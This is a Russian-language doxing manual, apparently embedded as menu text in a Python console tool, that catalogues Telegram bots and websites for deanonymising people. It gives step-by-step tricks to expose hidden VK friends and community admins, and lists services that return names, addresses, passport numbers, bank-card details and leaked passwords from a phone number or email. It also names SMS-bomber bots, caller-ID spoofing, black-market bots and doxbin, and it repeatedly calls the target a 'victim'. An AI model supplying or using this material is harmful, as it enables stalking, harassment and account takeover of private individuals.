2. Откройте Google, и вставьте туда этот ID, например: id123456
3. В результатах поиска откройте такие сайты как facestrana.ru или boberbook.ru или vkanketa.ru или vkglobal.ru или другой который похож на эти
4. На сайте будет анкета другого человека(это один из друзей), скопируйте ID этого аккаунта(ID в пункте основная информация)
5. Перейдите по ссылке 220vk.com - https://220vk.com/commonFriends
6. В первом поле вставьте ID друга, а во втором ID приватного аккаунта
7. Нажмите кнопку "искать общих друзей"

Если друзей не нашлось или их мало, воспользуйтесь ID другого друга из результатов поиска в Google


😎 Как найти владельца сообщества VK

Через приложение
└ Откройте VKinfo(https://vk.com/app7183114) и впишите ссылку на сообщество

Через сайт
└ Откройте http://yzad.ru и дайте ссылку на паблик

Через документы
1. Откройте раздел документы в сообществе
2. Откройте исходный код страницы (Ctrl+U)
3. Откройте окно поиска(Ctrl+F)
4. В окне поиска введите имя файла которое есть в сообществе. В результатах должна быть строка с именем файла, пример:
[["439837850","xls","OkiDoki.xls","806 КБ, 01 октбр 2020 в 17:59","-27921417",0,"","138633190",false,1,""]]
где OkiDoki.xls имя файла, а 138633190 ID пользователя загрузившего этот файл, как правило это ID админа


🎂 Как узнать скрытый возраст владельца аккаунта VK

└ Установите расширение для браузера VKopt скачав здесь - https://vkopt.net/download/


Дополнения:


====================================================================================================================================================
https://t.me/HowToFind - помогает найти информацию по известным данным. Очень мощная штука. 
https://t.me/InstaBot - скачивает фото, видео, аватарки, истории из Instagram 
https://t.me/VKUserInfo_bot - Удобный способ спарсить открытую информацию аккаунта ВК по id 
https://t.me/InfoVkUser_bot - позволяет провести анализ друзей профиля и выдает город + ВУЗ 
https://t.me/Smart_SearchBot - поиск информации по номеру телефона 
https://t.me/egrul_bot - сведения о государственной регистрации юрлиц и ИП 
https://t.me/buzzim_alerts_bot - бот для мониторинга открытых каналов и групп в Telegram 
https://t.me/callcoinbot - звонилка
https://t.me/TempGMailBot - выдает временный адрес [домен: ....gmail.com] 
https://t.me/DropmailBot - выдает временный адрес [домен: ....laste.ml] 
https://t.me/fakemailbot - выдает временный адрес [домен: ....hi2.in] 
https://t.me/etlgr_bot - временые адреса c возможностью повторного использования и отправки сообщений.
https://t.me/remindmemegabot - хорошая напоминалка 
https://t.me/MoneyPieBot - поможет не забыть о ваших долгах 
https://t.me/SmsBomberTelegram_bot
https://t.me/SmsB0mber_bot
https://t.me/smsbomberfreebot
https://t.me/flibustafreebookbot - библиотека книг (флибуста, https://flibusta.appspot.com/) 
https://t.me/Instasave_bot - скачивает видео из Instagram. Бот справляется всего за несколько секунд — достаточно отправить ссылку, и он скачивает файл самостоятельно. 
https://t.me/red_cross_bot - бот накладывает красный крест на любое изображение, отправленное ему. 
https://t.me/vk_bot - бот, позволяющий настроить интеграцию с VKontakte. 
https://t.me/VoiceEffectsBot - меняет тон вашей голосовухи, можно добавить эффекты итп.
https://t.me/roundNoteBot - бот, который превращает любое видео в кругляшку, будто кто то ее сам снял.
https://t.me/ParserFree2Bot - юзабельный бесплатный парсер чатов, на 100% выполняющий свою функцию 
https://t.me/DotaGosuBot - Бот, генерирует оскорбления. 
https://t.me/URL2IMGBot - Бот делает скриншот сайта, по отправленной вами ссылке. [​IMG] 
https://t.me/imgurbot_bot - ТГ бот, кидаешь ему картинку, он создаёт ссылку на имгур. [​IMG]
====================================================================================================================================================

====================================================================================================================================================
@Smart_SearchBot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.
@Getcontact_Officalbot – показывает как номер телефона записан в контактах других людей
@info_baza_bot – база данных номеров телефона, email
@get_caller_bot - Ищет только по номеру телефона. На выходе: ФИО, дата рождения, почта и «ВКонтакте»
@OpenDataUABot – по коду ЕДРПОУ возвращает данные о компании из реестра, по ФИО — наличие регистрации ФОП
@YouControlBot - полное досье на каждую компанию Украины
@mailseatchbot - По запросу пробива e-mail выдает открытый пароль от ящика если тот есть в базе
@Dosie_Bot – создатели «Досье» пошли дальше и по номеру телефона отдают ИНН и номер паспорта
@UAfindbot – База данных Украины
====================================================================================================================================================

====================================================================================================================================================
@FindClonesBot – Поиск человека по фото
@MsisdnInfoBot - Получение сведений о номере телефона
@AVinfoBot - Поиск сведений об автовладельце России
@antiparkon_bot - Поиск сведений об автовладельце
@friendsfindbot - Поиск человека по местоположению
@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта России
@last4mailbot (Mail2Phone) — по почте показывает статус: есть ли аккаунт в «Одноклассниках» и «Сбербанке», или нет.
@bmi_np_bot - По номеру телефона определяет регион и оператора.
@whoisdombot - пробивает всю основную информацию о нужном домене (адрес сайта), IP и другое.
@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в FaceBook.
@buzzim_alerts_bot - Ищет упоминания ников/каналов в чатах статьях.
@avinfobot - по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.
@VKUserInfo_bot — по ID «ВКонтакте» возвращает расширенную информацию о профиле.
@GetGmail_bot (GetGmail — OSINT email search) — по gmail-почте отдает Google ID, зная который, можно получить архив альбомов Google.
@telesint_bot (TeleSINT) — информация об участии пользователей Telegram в открытых и закрытых группах. Поиск — по нику.
@iptools_robot — бот для быстрого поиска информации о домене и ip адресе. Бот конечно же бесплатный
@phone_avito_bot — найдет аккаунт на Авито по номеру телефона России. Еще бот показывает данные из GetContact.
@Dosie_bot – теперь бот дает еще больше информации. Для нового аккаунта 3 бесплатные полные попытки поиска.
====================================================================================================================================================

====================================================================================================================================================
@egrul_bot - Данный бот пробивает Конторы/ИП. По вводу ФИО/Фирмы предоставляет ИНН объекта; 
учредителей бизнеса/партнеров и отчет налоговую декларацию. И наоборот: поиск по ИНН выдаст ФИО/конторы.

@get_kontakt_bot- Бот пробивает номер мобильного телефона. 
Как записан запрашиваемый контакт в разных телефонных книжках ваших товарищей/подруг/коллег.

@mailsearchbot - По запросу пробива e-mail бот выдает открытый «password» от ящика. Очень огромная/крутая БД

@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на личность в Фэйсбуке.

@buzzim_alerts_bot - Поисковая система по платформе Telegram. 
Ищет упоминания ников/каналов в чатах статьях. Присутствует функция оповещения, если что-то где-то всплывёт.

@AvinfoBot - Бот, который по вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru.
====================================================================================================================================================

====================================================================================================================================================
Боты черных рынков: 

@Darksalebot

@SafeSocks_Bot

@flood_sms_bot
====================================================================================================================================================

====================================================================================================================================================
1. EGRUL
@egrul_bot - Пробивает конторы/ИП, по вводу ФИО/фирмы предоставляет ИНН объекта, 
учредителей бизнеса/партнеров и отчет налоговую декларацию. 
И наоборот: поиск по ИНН выдаст ФИО/конторы. Работает по РФ.

2. BMI NP
@bmi_np_bot - По номеру телефона определяет регион и оператора.
Интересно, что этот бот определяет даже новые номера и определяет номера, которые были перенесены совершенно недавно.

3. WHOIS DOMAIN
@whoisdombot - Пробивает всю основную информацию о нужном домене (адрес сайта), IP и подобное.

4. MAILSEARCH
@mailsearchbot - По запросу e-mail выдает открытый пароль от ящика, если тот есть в базе. 
Очень серьезная база данных. Висит давно, 1.5 млрд учёток, год актуальности ~<2014г.. 
Удобно составлять/вычислять персональные чарсеты с помощью, например, JTR.

5. GETFB
@getfb_bot - По запрашиваемому номеру телефона выдает ссылку на профиль в FaceBook.

6. BUZZIM ALERPTS
@buzzim_alerts_bot - Поисковая система по платформе Telegram. Ищет упоминания ников/каналов в чатах статьях. 
Присутствует функция оповещения, если что-то где-то всплывёт. 
Например, можно посмотреть какие каналы разнесли твои посты с Telegram, проверить ник юзера, где он еще трепался.

7. AVINFO
@avinfobot - По вводу мобильного телефона выдаст номер машины/марку, а также ссылку и все объявления на Avito.ru. 
В демо-режиме бесплатно доступно несколько таких поисков/отчетов. Ценник за функционал приличный, 
некоторые хитрожопые юзеры только ради этого бота сбрасывают свой аккаунт в Telegram, 
чтобы бесплатно пробивать своих жертв (бесконечное удаление/регистрация учетки на один и тот же номер телефона).

8. HOWTOFIND
@howtofind_bot - Робот разведчик. Подскажет секреты и приемы OSINT.

9. SMART SEARCH
@smart_searchbot - Помогает найти дополнительную информацию, относительно телефонного номера, id ВКонтакте, email, или ИНН юр./физ. лица.



====================================================================================================================================================
Как найти аккаунт в ВК зная e-mail адрес от Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке 
3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) 
4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com 

Работает не со всеми аккаунтами и игнорируйте ссылку на страницу VK Яндекс Музыки!
Как по адресу Яндекс почты найти отзывы на картах Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN 
3. Откройте исходный код страницы (Ctrl+U) 
4, Откройте поиск по странице (Ctrl+F) и введите туда public_id 
5. В результатах поиска будет 2 таких словосочетания, найдите второе 
6. После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать. 
7. Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали) и откройте эту ссылку
==================================================================================================================================================== 

ОЧЕНЬ ХОРОШИЙ САЙТ, КОТОРЫЙ СОДЕРЖИТ ТОННЫ И ТОННЫ ДОКСИНГОВЫХ ИНСТРУМЕНТОВ https://cybertoolbank.cc p.s про него мало кто знает (на английском)

Три самых ахуенных сайта через которые ты можешь дальше развиваться в данной сфере:
https://xss.is/
http://probiv.one/
https://rutor.wtf

https://spyse.com/ — поисковая система по кибербезопасности для получения технической информации, которая обычно используется некоторыми хакерами в киберразведке.

Как найти аккаунт в ВК зная e-mail адрес от Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://music.yandex.com/users/LOGIN и перейдите по ссылке 
3. Если аккаунт нашелся, то откройте исходный код страницы (Ctrl+U) 
4. Откройте поиск по странице (Ctrl+F) и введите туда vk.com 

Работает не со всеми аккаунтами и игнорируйте ссылку на страницу VK Яндекс Музыки!
Как по адресу Яндекс почты найти отзывы на картах Яндекса 

1. Уберите из адреса почты @yandex.ru, у вас останется логин 
2. Вставьте логин в ссылку https://yandex.ru/collections/user/LOGIN 
3. Откройте исходный код страницы (Ctrl+U) 
4, Откройте поиск по странице (Ctrl+F) и введите туда public_id 
5. В результатах поиска будет 2 таких словосочетания, найдите второе 
6. После второго public_id идет набор цифр и букв (например: c48fhxw0qppa50289r5c9ku4k4) которое нужно скопировать. 
7. Вставьте скопированный текст в этот URL - https://yandex.ru/user/<Public_id> (замените <Public_id> на то что вы скопировали) и откройте эту ссылку.
==================================================================================================================================================== 


Поиск контрагента

https://service.nalog.ru/zd.do - Сведения о юридических лицах, имеющих задолженность по уплате налогов и/или не представляющих налоговую отчетность более года
https://service.nalog.ru/addrfind.do - Адреса, указанные при государственной регистрации в качестве места нахождения несколькими юридическими лицами
https://service.nalog.ru/uwsfind.do - Сведения о юридических лицах и индивидуальных предпринимателях, в отношении которых представлены документы для государственной регистрации
https://service.nalog.ru/disqualified.do - Поиск сведений в реестре дисквалифицированных лиц
https://service.nalog.ru/disfind.do - Юридические лица, в состав исполнительных органов которых входят дисквалифицированные лица
https://service.nalog.ru/svl.do - Сведения о лицах, в отношении которых факт невозможности участия (осуществления руководства) в организации установлен (подтвержден) в судебном порядке
https://service.nalog.ru/mru.do - Сведения о физических лицах, являющихся руководителями или учредителями (участниками) нескольких юридических лиц

https://fedresurs.ru/ - Единый федеральный реестр юридически значимых сведений о фактах деятельности юридических лиц, индивидуальных предпринимателей и иных субъектов экономической деятельности 

http://rkn.gov.ru/mass-communications/reestr/ – реестры Госкомнадзора.
http://www.chinacheckup.com/ – лучший платный ресурс по оперативной и достоверной верификации китайских компаний.
http://www.dnb.com/products.html - модернизированный ресурс одной из лучших в мире компаний в сфере бизнес-информации Dun and Bradstreet.
http://www.imena.ua/blog/ukraine-database/ – 140+ общедоступных электронных баз данных Украины.
http://www.fciit.ru/ – eдиная информационная система нотариата России.
http://gradoteka.ru/ – удобный сервис статистической информации по городам РФ.
http://www.egrul.ru/ - сервис по поиску сведений о компаниях и директорах из государственных реестров юридических лиц России и 150 стран мира.
http://disclosure.skrin.ru - уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “СКРИН”.
http://1prime.ru/docs/product/disclosure.html – уполномоченное ФСФР (Федеральной службой по финансовым рынкам) на раскрытие информации на рынке ценных бумаг агентство ЗАО “Прайм-ТАСС”.
https://www.cbr.ru/ - информация ЦБ по бюро кредитных историй, внесенных в государственный реестр.
http://www.gks.ru/accounting_report – предоставление данных бухгалтерской отчетности по запросам пользователей от Федеральной службы государственной статистики.
http://www.tks.ru/db/ – таможенные онлайн базы данных.
http://tipodop.ru/ - очередной каталог предприятий, организаций в России.
http://www.catalogfactory.org/ – организации России – финансовые результаты, справочные данные и отзывы. Данные в настоящее время доступны по 4,8 млн.организаций.
http://pravo.ru/ – справочно-информационная система, включающая в настоящее время 40 млн. законодательных, нормативных и поднормативных актов Российской Федерации.
http://azstatus.ru/ – информационная база данных, в которой содержится информация обо всех предпринимателях Российской Федерации, а также информация о российских компаниях (юридические лица). Всего в справочнике более 10 миллионов записей.
http://seldon.ru/ – информационно-аналитическая система, значительно упрощающая и систематизирующая работу с закупками.
http://www.reestrtpprf.ru/ – реестр надежных партнеров от системы Торгово-промышленных палат в Российской Федерации.
http://iskr-a.com/ – сообщество безопасников и платформа для информационного взаимодействия в одном флаконе.
http://www.ruscentr.com/ - реестр базовых организаций российской экономики, добросовестных поставщиков и бюджетоэффективных заказчиков (организаций).
https://www.aips-ariadna.com/ – антикриминальная онлайн система учета по России и СНГ. Относится к тому же ценовому сегменту, что и «Контур Фокус» и т.п., и отличается от других систем большим уклоном в судебные и правоохранительные данные. Ориентирована прежде всего на службу безопасности.
http://188.254.71.82/rds_ts_pub/ – единый реестр зарегистрированных деклараций РФ.
http://croinform.ru/index.php?page=index – сервис проверки клиентов, конкурентов, партнеров и контрагентов в режиме реального времени 24/7, в т.ч. со смартфона. Цены вполне человеческие. Сервис знаменитого Кроноса.
http://www.zakupki.gov.ru/epz/main/public/home.html – официальный сайт Российской Федерации для размещения информации о размещении заказов на поставки товаров, выполнение работ, оказание услуг.
http://rostender.info/ – ежедневная рассылка новых тендеров в соответствии с отраслевыми и региональными настройками.
http://pravo.fso.gov.ru/ – государственная система правовой информации. Позволяет быть в курсе всех новых правовых актов. Имеет удобный поисковик.
http://www.bicotender.ru/ - самая полная поисковая система тендеров и закупок по России и странам СНГ.
http://sophist.hse.ru/ – единый архив экономических и социологических данных по российской Федерации от НИУ ВШЭ.
http://www.tenderguru.ru/ – национальный тендерный портал, представляет собой единую базу государственных и коммерческих тендеров с ежедневной рассылкой анонсов по объявленным тендерам.
http://www.moscowbase.ru/ - поддерживаемые в состоянии постоянной актуальности адресно-телефонные базы данных по компаниям Москвы и России. Уникальным продуктом компании являются базы данных новых компаний, появившихся в течение двух последних кварталов. В данные включается вся стандартная информация, предоставляемая платными онлайн базами, плюс актуальные внутренние телефоны и e-mail.
http://www.credinform.ru/ru-RU/globas - информационно-аналитическая система ГЛОБАС – I содержит данные о семи миллионах компаний. Предназначена для комплексной информационной поддержке бизнеса и создания комплексных аналитических отчетов.
http://www.actinfo.ru/ – отраслевой бизнес-справочник предприятий России по их актуальным почтовым адресам и контактным телефонам. Единственный справочник, который включает контактные данные по предприятиям, созданным в предыдущем квартале.
http://www.sudrf.ru/ -государственная автоматизированная система РФ «Правосудие».
http://docs.pravo.ru/ – справочно-правовая система Право.ру. Предоставляет полный доступ к нормативным документам любых субъектов Российской Федерации, а также к судебной практике арбитражных судов и мнениям экспертов любых юридических областей. Ежемесячная плата для работы с полной базой документов составляет 500 руб.
http://www.egrul.com/ – платные и бесплатные сервисы поиска по ЕГРЮЛ, ЕГРИП, ФИО, балансам предприятий и др. параметрам. Одно из лучших соотношений цены и качества.
http://www.fedresurs.ru/ – единый федеральный реестр сведений о фактах деятельности юридических лиц.
http://www.findsmi.ru/ – бесплатный сервис поиска данных по 65 тыс. региональных СМИ.
http://hub.opengovdata.ru/ – хаб, содержащий открытые государственные данные всех уровней, всех направлений. Проект Ивана Бегтина.
http://www.ruward.ru/ – ресурс агрегатор всех рейтингов Рунета. В настоящее время уже содержит 46 рейтингов и более 1000 компаний из web и PR индустрии.
http://www.b2b-energo.ru/firm_dossier/ - информационно-аналитическая и торгово-операционная система рынка продукции, услуг и технологий для электроэнергетики.
http://opengovdata.ru/ – открытые базы данных государственных ресурсов
http://bir.1prime.ru/ – информационно-аналитическая система «Бир-аналитик» позволяет осуществлять поиск данных и проводить комплексный анализ по всем хозяйствующим субъектам России, включая компании, кредитные организации, страховые общества, регионы и города.
http://www.prima-inform.ru/ – прямой доступ к платным и бесплатным информационным ресурсам различных, в т.ч. контролирующих организаций. Позволяет получать документы и сводные отчеты, информацию о российских компаниях, индивидуальных предпринимателях и физических лицах, сведения из контролирующих организаций. Позволяет проверять субъектов на аффилированность и многое другое.
http://www.integrum.ru/ –портал для конкурентной разведки с самым дружественным интерфейсом. Содержит максимум информации, различных баз данных, инструментов мониторинга и аналитики. Позволяет компании в зависимости от ее нужд, размеров и бюджета выбирать режим пользования порталом.
www.spark-interfax.ru – портал обладает необходимой для потребностей конкурентной разведки полнотой баз данных, развитым функционалом, постоянно добавляет новые сервисы.
https://fira.ru/ – молодой быстроразвивающийся проект, располагает полной и оперативной базой данных предприятий, организаций и регионов. Имеет конкурентные цены.
www.skrin.ru – портал информации об эмитентах ценных бумаг. Наряду с обязательной информацией об эмитентах содержит базы обзоров предприятий, отраслей, отчетность по стандартам РБУ, ГААП, ИАС. ЗАО “СКРИН” является организацией, уполномоченной ФСФР.
http://www.magelan.pro/ – портал по тендерам, электронным аукционам и коммерческим закупкам. Включает в себя качественный поисковик по данной предметной сфере.
http://www.kontragent.info/ – ресурс предоставляет информацию о реквизитах контрагентов и реквизитах, соответствующих ведению бизнеса.
http://www.ist-budget.ru/ – веб-сервис по всем тендерам, госзаказам и госзакупкам России. Включает бесплатный поисковик по полной базе тендеров, а также недорогой платный сервис, включающий поиск с использованием расширенных фильтров, по тематическим каталогам. Кроме того, пользователи портала могут получать аналитические отчеты по заказчикам и поставщикам по тендерам. Есть и система прогнозирования возможных победителей тендеров.
http://www.vuve.su/ - портал информации об организациях, предприятиях и компаниях, ведущих свою деятельность в России и на территории СНГ. На сегодняшний день база портала содержит сведения о более чем 1 млн. организаций.
http://www.disclosure.ru/index.shtml - система раскрытия информации на рынке ценных бумаг Российской Федерации. Включает отчетность эмитентов, существенные новости, отраслевые обзоры и анализ тенденций.
http://www.mosstat.ru/index.html – бесплатные и платные онлайн базы данных и сервисы по ЕГРПО и ЕГРЮЛ Москвы и России, а также бухгалтерские балансы с 2005 года по настоящее время. По платным базам самые низкие тарифы в Рунете. Хорошая навигация, удобная оплата, качественная и оперативная работа.
http://www.torg94.ru/ – качественный оперативный и полезный ресурс по госзакупкам, электронным торгам и госзаказам.
http://www.k-agent.ru/ – база данных «Контрагент». Состоит из карточек компаний, связанных с ними документов, списков аффилированных лиц и годовых бухгалтерских отчетов. Документы по компаниям представлены с 2006 г. Цена в месяц 900 руб. Запрашивать данные можно на сколь угодно много компаний.
http://www.is-zakupki.ru/ – информационная система государственных и коммерческих закупок. В системе собрана наиболее полная информация по государственным, муниципальным и коммерческим закупкам по всей территории РФ. Очень удобна в работе, имеет много дополнительных сервисов и, что приятно, абсолютно разумные, доступные даже для малого бизнеса цены.
http://salespring.ru/ – открытая пополняемая база данных деловых контактов предприятий России и СНГ и их сотрудников. Функционирует как своеобразная биржа контактов.
www.multistat.ru – многофункциональный статистический портал. Официальный портал ГМЦ Росстата.
http://sanstv.ru/photomap/ (поиск фото по геометкам в соц. сетях)
Карта движения судов в реальном времени: https://www.marinetraffic.com
Карта движения судов в реальном времени: https://seatracker.ru/ais.php
Карта движения судов: http://shipfinder.co/
Отслеживание самолетов: https://planefinder.net/
Отслеживание самолетов: https://www.radarbox24.com/
Отслеживание самолетов: https://de.flightaware.com/
Отслеживание самолетов: https://www.flightradar24.com

Общий поиск по соц. сетям, большой набор разных инструментов для поиска:
- http://osintframework.com/
https://findclone.ru/- Лучшая доступная технология распознавания лиц (документация)

Поиск местоположения базовой станции сотового оператора:
- http://unwiredlabs.com
- http://xinit.ru/bs/

https://www.reestr-zalogov.ru/search/index - Реестр уведомлений о залоге движимого имущества
https://мвд.рф/wanted - Внимание, розыск! можно порофлить тут или кинуть еблет жертвы в подслушку города хаххахахахахахахха
https://www.mos.ru/karta-moskvicha/services-proverka-grazhdanina-v-reestre-studentov/ - Проверка гражданина в реестре студентов/ординаторов/аспирантов (держатели карты москвича)
http://esugi.rosim.ru - Реестр федерального имущества Российской Федерации
pd.rkn.gov.ru/operators-registry - Реестр операторов, осуществляющих обработку персональных данных
bankrot.fedresurs.ru - Единый федеральный реестр сведений о банкротстве.
==================================================================================================================================================== 
▫️ Lampyre (https://account.lampyre.io/email-and-phone-lookup) — веб версия поиска по любому номеру телефона, поиск по почте
▫️ Getcontact (https://getcontact.com/) — найдет информацию о том как записан номер в контактах
▫️ Truecaller (https://www.truecaller.com/) — телефонная книга, найдет имя и оператора телефона
▫️ Bullshit (https://mirror.bullshit.agency/) — поиск объявлений по номеру телефона
▫️ Bases-brothers (https://bases-brothers.ru/) — поиск номера в объявлениях
▫️ Microsoft (http://account.live.com/) — проверка привязанности номера к microsoft аккаунту
▫️ Avinfo.guru (https://avinfo.guru/) — проверка телефона владельца авто, иногда нужен VPN
▫️ Telefon.stop-list (http://telefon.stop-list.info/) — поиск по всем фронтам, иногда нет информации
▫️ @numberPhoneBot (https://t.me/@numberPhoneBot) — найдет адрес и ФИО, не всегда находит
▫️ Rosfirm (https://gutelu.rosfirm.info/) — найдет ФИО, адрес прописки и дату рождения, нужно знать город
▫️ Spravnik (https://spravnik.com/) — поиск по городскому номеру телефона, найдет ФИО и адрес
▫️ @usersbox_bot (https://t.me/@usersbox_bot) — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер
▫️ Spiderfoot (https://www.spiderfoot.net/) — автоматический поиск с использованием огромного количества методов, ножно использовать в облаке если пройти регистрацию
▫️ Locatefamily (https://www.locatefamily.com/) — поиск адреса и ФИО
▫️ Nuga — поиск instagram
▫️ Live.com (http://account.live.com/) — Проверка привязки к майкрософт
▫️ Telefon (http://telefon.stop-list.info/) — Поиск по всем фронтам
▫️ @FindNameVk_bot (https://t.me/@FindNameVk_bot) — Бот ищет историю смены фамилий профиля по открытым источникам, указывает дату создания аккаунта.
▫️ @InfoVkUser_bot (https://t.me/@InfoVkUser_bot) — Бот позволяет провести анализ друзей профиля.
==================================================================================================================================================== 

1. https://regvk.com - узнать цифровой ID человека ВКонтакте.
2. https://rusfinder.pro/vk/user/id********* (здесь цифровой ID) - узнать данные указанные при регистрации аккаунта ВКонтакте.
Если ничего старого нет, обновите страницу и быстро делайте скрин области. С новорегами не работает.
3. http://archive.fo - просмотреть web-архив страницы. Редко помогает.
4. https://220vk.com - посмотреть скрытых друзей пользователя ВКонтакте. Работает только со старыми страницами, закрытые профили не чекает.
5. Ошибка <h1>503 Bad Gateway</h1> на DonatePay/DonationAlerts.
Если пользователь использует донат-сервисы, вы можете попытаться узнать его номер сделав ошибку через просмотр кода элемента на странице оплаты. Работает по сей день.
6. https://zhuteli.rosfirm.info - одна из баз данных адресов. Многих городов нет, ищем по районному центру.
7. https://nomer.org - одна из баз данных адресов. Есть множество городов, поиск только по фамилии.
8. https://spravochnik-sng.com - база данных адресов, телефонов, а также сервис по установлению родственных связей.
9. https://mirror.bullshit.agency - сервис пробива адресов по номеру телефона, указанному на Авито. Работает в 70% случаев.
10. https://phoneradar.ru - узнать город по номеру телефона.
Если не удается найти адрес, можно узнать хотя бы город/районный центр и сузить круг поисков.
11. Приложение VKInfo или Group боты - позволяют узнать созданные группы на странице, отсеять старые никнеймы.
12. https://lampyre.io - узнать страницы социальных сетей и пароли по номеру телефона или почте. Доступно 4 пробива на 1 аккаунт.
Абузим с помощью http://temp-mail.org. Помимо веб-сервиса, доступна программа с расширенным функционалом (например поиск билетов Аэрофлота).
Позволяет строить графики.
13. https://www.maltego.com - расширенный аналог Lampyre. Не веб-сервис, софт. Чтобы скачать, опускаемся вниз сайта.
После установки, выбираем функционал Maltego CE. Позволяет строить графики.
14. https://www.palantir.com - данные о западных организациях.
Подойдет для деанонимизаций родственников пользователя из ближней Европы (Латвия, Литва, Польша, Финляндия, Эстония). Позволяет строить графики.
15. https://vk.watch - помогает узнать, как выглядела страница ВКонтакте за разные промежутки времени. Подписка стоит 3,6 евро.
16. https://ytch.ru/  - помогает узнать историю изменений на канале YouTube.
17. Telegram @mailsearchbot - помогает узнать пароли жертвы по номеру телефона, почте, никнейму. Без подписки показывает неполностью, но подобрать можно.
18. Telegram @EyeGodsBot - помогает узнать привязки, а также имеет эксклюзивную функцию поиска по фото всего за 5 рублей по подписке.
19. Telegram @AvinfoBot - помогает узнать владельца автомобиля по госномеру, проверить историю продажи автомобиля, проверить автомобиль на участие в ДТП и многое другое.
20. Telegram @FindNameVk_bot - позволяет узнать историю изменений имени пользователя в ВК.
==================================================================================================================================================== 
Список способов поиска в социальных сетях. Некоторые связки.

1. Имя (без фамилии) + город (районный центр/поселок/село) + дата рождения (число).
2. ИФ + город (путем отсеивания результатов).
3. Город (районный центр) + полная дата рождения.
4. Поиск родственников по фамилии (если известен возраст, в фильтрах ставим возраст ОТ по арифметической формуле 18+{полный возраст жертвы}), далее поиск в друзьях странных имен, ников (если не удается найти старые страницы по настоящим данным).
5. Идентификатор канала на YouTube в Google (позволяет узнать старое название канала).
==================================================================================================================================================== 
Боты черных рынков:
@Darksalebot
@SafeSocks_Bot
@flood_sms_bot
==================================================================================================================================================== 
@GetGmail_bot - Полезнейший инструмент, способный узнать ФИ по почте Gmail
psbdmp.ws - Поиск в текстах pastebin
Гайд по забугор доксингу - https://doxbin.org/upload/doxingguide

intext:(любые данные) - например url вконтакте и находит полную информацию о человеке, ибо все сайты лайкеры и остальные сайты
сохраняют информацию о человекею.
Пример:
intext:jfsjjsdlskdkfjd - писать в гугле и вылезут все данные.
==================================================================================================================================================== 
@COBP_HE_CTRAX
"""))
             input(Colorate.Vertical(Colors.cyan_to_green, "\n[+] Нажмите Enter, чтобы вернуться в главное меню."))

            if choice == '55':
             print(Colorate.Vertical(Colors.cyan_to_red, """
самый большой мануал по деанону


боты для пробива:

по нику

@clerkinfobot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах

@dosie_Bot — как и в боте uabaza дает информацио о паспорте только польностью, 3 бесплатные попытки

 @find_caller_bot — найдет ФИО владельца номера телефона

 @get_caller_bot — поиск по утечкам персональных данных и записным книгам абонентов, может найти ФИО, дату рождения, e-mail

@get_kolesa_bot — найдет объявления на колеса.кз

@get_kontakt_bot — найдет как записан номер в контактах, дает результаты что и getcontact

 @getbank_bot — дает номер карты и полное ФИО клиента банка

@GetFb_bot — бот находит Facebook

@Getphonetestbot — бот берет данные из приложения getcontact, показывает как записан номер телефона в контактах

@info_baza_bot — поиск в базе данных

@mailsearchbot — найдет часть пароля

 @MyGenisBot — найдет имя и фамилию владельца номера

@phone_avito_bot — найдет аккаунт на Авито

 @SafeCallsBot — бесплатные анонимные звонки на любой номер телефона с подменой Caller ID

@usersbox_bot — бот найдет аккаунты в ВК у которых в поле номера телефона указан искомый номер



Бот для пробива по номеру 



 @phone_avito_bot - пробив по номеру, выдаст Avito

 @HowToFind_bot - бот который может посоветовать различные Telegram каналы спомагательные для деанонимизации
+analog @osint_mindset

 @deanonym_bot — с помощью данного бота можно узнать номер любого пользователя Telegram

@getfb_bot - при помощи номера сможем найти аккаунт в Facebok

@GetYandexBot - пробив по почте выдает различные данные

 @GetPhone_Bot - пробив по номеру выдает различные данные


 @maigret_osint_bot — найдет аккаунты с таким ником, самый точный бот

 @mailsearchbot — найдет часть пароля, поиск по логину

 @StealDetectorBOT — найдет утекшие пароли аккаунта

 @info_baza_bot — покажет из какой базы слита почта, 2 бесплатных скана

@last4mailbot — бот найдет последние 4 цифры номера телефона клиента Сбербанка

 @mailsearchbot — ищет по базе, дает часть пароля

 @StealDetectorBOT — найдет утекшие пароли

 @GetGmail_bot — бот найдет адрес почты Gmail к которой привязан искомый email, 2 бесплатных результата и бесконечное число попыток

@SangMataInfo_bot - покажет историю смены ника и юзернейма по айди тг

@cryptoscanning_bot - покажет слитый номер, айпи по айди

@tgscanrobot - ищет чаты, в которых состоит человек по айди

@creationdatebot - покажет дату создания акка

@telesint_bot - покажет чаты(3 запроса бесплатных)

@TgAnalyst_bot - покажет слитый номер, айпи и геопозицию(не юзать на основном акке)

@CheckID_AIDbot - покажет айди аккаунта

@eyeofbeholder_bot - покажет интересы аккаунта


И так это были все боты которые мне удалось найти перейдем к сайтам


сайты:


Заходим на сайт 220vk.com там вы можете увидеть кого жертва добавляла и удалял таким способом можной найти родственников и одноклассников.

Заходим най сайт http://www.kody.su/check-tel#text.Вводим его киви(номер)и узнаем страну/город.

Сегодня речь пойдет о том, как пробить подробную информацию о человеке, имея минимум вводных данных о нем. 


МУЛЬТИСЕРВИСЫ
- У них реализован расширенный поиск (по E-mail, номеру телефона, ФИО, адресу, и т.д.) В результате, вы получаете более-менее подробную информацию по человеку. Вот некоторые сервисы:
https://socialcatfish.com
https://usersearch.org
https://thatsthem.com
https://www.spokeo.com
https://www.fastpeoplesearch.com
https://pipl.com

